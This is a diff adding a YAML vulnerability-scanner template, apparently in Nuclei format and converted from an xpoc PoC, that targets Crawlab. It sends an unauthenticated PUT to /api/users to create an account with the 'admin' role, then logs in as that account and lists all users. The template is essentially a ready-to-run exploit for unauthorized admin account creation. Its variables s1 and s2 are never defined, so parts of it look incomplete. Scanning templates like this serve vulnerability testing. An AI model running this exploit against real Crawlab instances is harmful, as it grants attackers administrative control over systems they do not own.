@@ -1,0 +1,37 @@
+id: yaml-poc-crawlab-crawlab-idor-CT-456787
+info:
+  name: Yaml Poc Crawlab Crawlab Idor Ct 456787
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-crawlab-crawlab-idor-CT-456787'
+  tags: xpoc
+  reference:
+  - http://wiki.peiqi.tech/wiki/webapp/Crawlab/Crawlab%20users%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.html
+http:
+- method: PUT
+  path:
+  - /api/users
+  body: '{"username":"{{s2}}","password":"{{s2}}","role":"admin","email":"{{s2}}@qq.com"}'
+  headers:
+    Content-Type: application/json
+- method: POST
+  path:
+  - /api/login
+  body: '{"username":"{{s2}}","password":"{{s2}}"}'
+  headers:
+    Content-Type: application/json
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /api/users
+  headers:
+    Authorization: '{{s1}}'
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
